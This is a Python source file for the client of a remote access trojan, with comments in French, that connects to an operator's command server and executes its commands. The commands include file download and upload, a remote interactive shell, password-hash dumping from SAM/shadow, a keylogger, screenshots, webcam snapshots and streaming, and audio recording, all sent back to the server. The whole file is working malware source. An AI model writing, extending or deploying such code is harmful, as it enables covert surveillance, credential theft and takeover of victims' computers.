"""Client RAT - Se connecte au serveur et exécute les commandes."""

import argparse
import base64
import logging
import os
import socket
import ssl
import sys
import threading
import time
from pathlib import Path
from typing import Any, Dict, Optional

# Ajout du répertoire parent au path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from common.crypto import SecureSocket
from common.protocol import Message, MessageType

from client.modules import (
    audio,
    filesystem,
    hashdump,
    keylogger,
    screenshot,
    search,
    shell,
    system_info,
    webcam,
)

logger = logging.getLogger(__name__)


class RATClient:
    """Client RAT qui se connecte au serveur et exécute les commandes."""

    COMMAND_MAP = {
        "help": MessageType.CMD_HELP,
        "download": MessageType.CMD_DOWNLOAD,
        "upload": MessageType.CMD_UPLOAD,
        "shell": MessageType.CMD_SHELL,
        "ipconfig": MessageType.CMD_IPCONFIG,
        "screenshot": MessageType.CMD_SCREENSHOT,
        "search": MessageType.CMD_SEARCH,
        "hashdump": MessageType.CMD_HASHDUMP,
        "keylogger_start": MessageType.CMD_KEYLOGGER_START,
        "keylogger_stop": MessageType.CMD_KEYLOGGER_STOP,
        "keylogger_get": MessageType.CMD_KEYLOGGER_GET,
        "webcam_snapshot": MessageType.CMD_WEBCAM_SNAPSHOT,
        "webcam_stream_start": MessageType.CMD_WEBCAM_STREAM_START,
        "webcam_stream_stop": MessageType.CMD_WEBCAM_STREAM_STOP,
        "record_audio_start": MessageType.CMD_RECORD_AUDIO_START,
        "record_audio_stop": MessageType.CMD_RECORD_AUDIO_STOP,
    }

    def __init__(self, server_host: str = "127.0.0.1", server_port: int = 8888, use_ssl: bool = True):
        self.server_host = server_host
        self.server_port = server_port
        self.use_ssl = use_ssl
        self.secure = SecureSocket() if use_ssl else None
        self.sock: Optional[ssl.SSLSocket] = None
        self.running = False

        # Modules
        self.interactive_shell = shell.InteractiveShell()
        self.keylogger = keylogger.Keylogger()
        self.webcam_streamer: Optional[webcam.WebcamStream] = None
        self.audio_recorder: Optional[audio.AudioRecorder] = None

        # Buffer pour streaming (audio uniquement)
        self._stream_buffers: Dict[str, list] = {}
        self._stream_locks: Dict[str, threading.Lock] = {}

    # ---- Connexion ----

    def connect(self) -> bool:
        try:
            logger.info(f"Tentative de connexion à {self.server_host}:{self.server_port}...")
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            raw_sock.settimeout(10)

            if self.use_ssl:
                self.sock = self.secure.wrap_client_socket(raw_sock, hostname=self.server_host)
            else:
                self.sock = raw_sock

            self.sock.connect((self.server_host, self.server_port))
            self.sock.settimeout(None)

            logger.info("Connexion établie" + (" avec TLS" if self.use_ssl else " (sans TLS)"))
            return True

        except ssl.SSLError as e:
            logger.error(f"Erreur SSL : {e}")
            return False
        except socket.timeout:
            logger.error("Timeout de connexion")
            return False
        except ConnectionRefusedError:
            logger.error("Connexion refusée")
            return False
        except Exception as e:
            logger.error(f"Erreur de connexion : {e}")
            return False

    def send_message(self, msg: Message):
        if not self.sock:
            raise ConnectionError("Non connecté au serveur")
        data = msg.to_bytes()
        SecureSocket.send_data(self.sock, data)

    def recv_message(self) -> Optional[Message]:
        try:
            data = SecureSocket.recv_data(self.sock)
            if not data:
                return None
            return Message.from_bytes(data)
        except (ssl.SSLError, ConnectionError, TimeoutError) as e:
            logger.error(f"Erreur réception : {e}")
            return None

    # ---- Gestion des commandes ----

    def handle_command(self, msg: Message) -> Optional[Message]:
        cmd = msg.type
        payload = msg.payload

        try:
            if cmd == MessageType.CMD_HELP:
                return self._cmd_help()
            elif cmd == MessageType.CMD_DOWNLOAD:
                return self._cmd_download(payload.get("path", ""))
            elif cmd == MessageType.CMD_UPLOAD:
                return self._cmd_upload(payload)
            elif cmd == MessageType.CMD_SHELL:
                return self._cmd_shell(payload)
            elif cmd == MessageType.CMD_IPCONFIG:
                return self._cmd_ipconfig()
            elif cmd == MessageType.CMD_SCREENSHOT:
                return self._cmd_screenshot()
            elif cmd == MessageType.CMD_SEARCH:
                return self._cmd_search(payload.get("pattern", ""))
            elif cmd == MessageType.CMD_HASHDUMP:
                return self._cmd_hashdump()
            elif cmd == MessageType.CMD_KEYLOGGER_START:
                return self._cmd_keylogger_start()
            elif cmd == MessageType.CMD_KEYLOGGER_STOP:
                return self._cmd_keylogger_stop()
            elif cmd == MessageType.CMD_KEYLOGGER_GET:
                return self._cmd_keylogger_get()
            elif cmd == MessageType.CMD_WEBCAM_SNAPSHOT:
                return self._cmd_webcam_snapshot()
            elif cmd == MessageType.CMD_WEBCAM_STREAM_START:
                return self._cmd_webcam_stream_start()
            elif cmd == MessageType.CMD_WEBCAM_STREAM_STOP:
                return self._cmd_webcam_stream_stop()
            elif cmd == MessageType.CMD_RECORD_AUDIO_START:
                return self._cmd_record_audio_start()
            elif cmd == MessageType.CMD_RECORD_AUDIO_STOP:
                return self._cmd_record_audio_stop()
            else:
                return Message(MessageType.RESP_ERROR, error=f"Commande inconnue : {cmd.value}")
        except Exception as e:
            logger.error(f"Erreur traitement commande {cmd}: {e}")
            return Message(MessageType.RESP_ERROR, error=str(e))

    # ---- Commandes ----

    def _cmd_help(self) -> Message:
        help_text = """
=== Commandes disponibles ===
help                  - Affiche cette aide
download <path>       - Télécharge un fichier de la cible
upload <path>         - Upload un fichier vers la cible
shell                 - Ouvre un shell interactif (bash/cmd)
ipconfig              - Affiche la configuration réseau
screenshot            - Prend une capture d'écran
search <pattern>      - Recherche un fichier
hashdump              - Récupère les hashes (SAM/shadow)
keylogger_start       - Démarre le keylogger
keylogger_stop        - Arrête le keylogger
keylogger_get         - Récupère les touches enregistrées
webcam_snapshot       - Prend une photo webcam
webcam_stream_start   - Démarre le streaming webcam (vidéo MP4)
webcam_stream_stop    - Arrête le streaming webcam et sauvegarde la vidéo
record_audio_start    - Démarre l'enregistrement audio
record_audio_stop     - Arrête l'enregistrement audio
"""
        return Message(MessageType.RESP_OK, output=help_text.strip())

    def _cmd_download(self, path: str) -> Message:
        if not path:
            return Message(MessageType.RESP_ERROR, error="Chemin requis")
        success, content, filename = filesystem.download_file(path)
        if success:
            return Message(
                MessageType.RESP_FILE,
                filename=filename,
                data=base64.b64encode(content).decode("utf-8"),
                size=len(content),
            )
        return Message(MessageType.RESP_ERROR, error=filename)

    def _cmd_upload(self, payload: dict) -> Message:
        path = payload.get("path", "")
        content_b64 = payload.get("data", "")
        if not path or not content_b64:
            return Message(MessageType.RESP_ERROR, error="Chemin et données requis")
        result = filesystem.upload_file(path, content_b64)
        if result.startswith("[+]"):
            return Message(MessageType.RESP_OK, output=result)
        return Message(MessageType.RESP_ERROR, error=result)

    def _cmd_shell(self, payload: dict) -> Message:
        action = payload.get("action", "")
        if action == "start":
            return Message(MessageType.RESP_OK, output=self.interactive_shell.start())
        elif action == "stop":
            return Message(MessageType.RESP_OK, output=self.interactive_shell.stop())
        elif action == "exec":
            command = payload.get("command", "")
            output = self.interactive_shell.execute(command)
            return Message(MessageType.RESP_SHELL_OUTPUT, output=output)
        else:
            return Message(MessageType.RESP_ERROR, error="Action shell invalide (start/stop/exec)")

    def _cmd_ipconfig(self) -> Message:
        info = system_info.get_ipconfig()
        return Message(MessageType.RESP_OK, output=info)

    def _cmd_screenshot(self) -> Message:
        try:
            img_data = screenshot.take_screenshot()
            return Message(
                MessageType.RESP_DATA,
                data=base64.b64encode(img_data).decode("utf-8"),
                format="png",
                size=len(img_data),
            )
        except Exception as e:
            return Message(MessageType.RESP_ERROR, error=str(e))

    def _cmd_search(self, pattern: str) -> Message:
        if not pattern:
            return Message(MessageType.RESP_ERROR, error="Motif requis")
        results = filesystem.search_file(pattern)
        return Message(MessageType.RESP_OK, output="\n".join(results))

    def _cmd_hashdump(self) -> Message:
        output = hashdump.dump_hashes()
        return Message(MessageType.RESP_OK, output=output)

    def _cmd_keylogger_start(self) -> Message:
        result = self.keylogger.start()
        if result.startswith("[+]"):
            return Message(MessageType.RESP_OK, output=result)
        return Message(MessageType.RESP_ERROR, error=result)

    def _cmd_keylogger_stop(self) -> Message:
        result = self.keylogger.stop()
        return Message(MessageType.RESP_OK, output=result)

    def _cmd_keylogger_get(self) -> Message:
        log = self.keylogger.get_log()
        return Message(MessageType.RESP_OK, output=log)

    def _cmd_webcam_snapshot(self) -> Message:
        try:
            img_data = webcam.webcam_snapshot()
            return Message(
                MessageType.RESP_DATA,
                data=base64.b64encode(img_data).decode("utf-8"),
                format="jpg",
                size=len(img_data),
            )
        except Exception as e:
            return Message(MessageType.RESP_ERROR, error=str(e))

    def _cmd_webcam_stream_start(self) -> Message:
        """Démarre le streaming webcam (enregistrement vidéo intégré)."""
        if not self.webcam_streamer:
            return Message(MessageType.RESP_ERROR, error="Streaming webcam non disponible")

        timestamp = int(time.time())
        os.makedirs("downloads", exist_ok=True)
        filename = f"downloads/stream_video_{timestamp}.mp4"

        result = self.webcam_streamer.start(video_filename=filename)
        if result.startswith("[+]"):
            return Message(MessageType.RESP_OK, output=result)
        return Message(MessageType.RESP_ERROR, error=result)

    def _cmd_webcam_stream_stop(self) -> Message:
        """Arrête le streaming webcam."""
        if not self.webcam_streamer:
            return Message(MessageType.RESP_OK, output="[+] Aucun streaming actif")
        result = self.webcam_streamer.stop()
        return Message(MessageType.RESP_OK, output=result)

    def _cmd_record_audio_start(self) -> Message:
        if self.audio_recorder:
            result = self.audio_recorder.start()
            if result.startswith("[+]"):
                return Message(MessageType.RESP_OK, output=result)
            return Message(MessageType.RESP_ERROR, error=result)
        return Message(MessageType.RESP_ERROR, error="Enregistreur audio non disponible")

    def _cmd_record_audio_stop(self) -> Message:
        if self.audio_recorder:
            audio_data = self.audio_recorder.stop()
            if audio_data:
                return Message(
                    MessageType.RESP_DATA,
                    data=base64.b64encode(audio_data).decode("utf-8"),
                    format="wav",
                    size=len(audio_data),
                )
            return Message(MessageType.RESP_OK, output="[+] Aucun audio enregistré")
        return Message(MessageType.RESP_OK, output="[+] Aucun enregistrement actif")

    # ---- Boucle principale ----

    def run(self):
        if not self.connect():
            logger.error("Impossible de se connecter au serveur")
            return

        self.running = True

        # Initialisation des modules de streaming
        self.webcam_streamer = webcam.WebcamStream(
            on_frame=lambda data: self._send_stream_frame(data)
        )
        self.audio_recorder = audio.AudioRecorder(
            on_chunk=lambda data: self._send_audio_chunk(data)
        )

        logger.info("Client prêt à recevoir des commandes")

        try:
            while self.running:
                msg = self.recv_message()
                if msg is None:
                    logger.info("Déconnexion du serveur")
                    break

                response = self.handle_command(msg)
                if response:
                    self.send_message(response)

        except (ssl.SSLError, ConnectionError) as e:
            logger.error(f"Erreur de connexion : {e}")
        except KeyboardInterrupt:
            logger.info("Arrêt demandé par l'utilisateur")
        finally:
            self.cleanup()

    # ---- Streaming (vidéo et audio) ----

    def _send_stream_frame(self, data: bytes):
        """Envoie une frame au serveur (la sauvegarde locale est faite par WebcamStream)."""
        try:
            msg = Message(
                MessageType.RESP_STREAM_FRAME,
                data=base64.b64encode(data).decode("utf-8"),
            )
            self.send_message(msg)
        except Exception as e:
            logger.debug(f"Erreur envoi frame : {e}")

    def _send_audio_chunk(self, data: bytes):
        """Envoie un chunk audio au serveur."""
        try:
            msg = Message(
                MessageType.RESP_AUDIO_CHUNK,
                data=base64.b64encode(data).decode("utf-8"),
            )
            self.send_message(msg)
        except Exception:
            pass

    def cleanup(self):
        """Nettoie les ressources avant arrêt."""
        logger.info("Nettoyage des ressources...")

        self.running = False

        if self.interactive_shell:
            self.interactive_shell.stop()
        if self.keylogger:
            self.keylogger.stop()
        if self.webcam_streamer:
            self.webcam_streamer.stop()
        if self.audio_recorder:
            self.audio_recorder.stop()

        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass

        logger.info("Client arrêté")


def setup_logging(debug: bool = False):
    level = logging.DEBUG if debug else logging.INFO
    logging.basicConfig(
        level=level,
        format="[%(asctime)s] %(levelname)s - %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )


def main():
    parser = argparse.ArgumentParser(description="RAT Client")
    parser.add_argument("--host", default="127.0.0.1", help="Adresse du serveur")
    parser.add_argument("--port", type=int, default=8888, help="Port du serveur")
    parser.add_argument("--debug", action="store_true", help="Mode debug")
    parser.add_argument("--no-ssl", action="store_true", help="Désactiver SSL (pour Windows)")
    args = parser.parse_args()

    setup_logging(args.debug)

    client = RATClient(server_host=args.host, server_port=args.port, use_ssl=not args.no_ssl)
    client.run()


if __name__ == "__main__":
    main()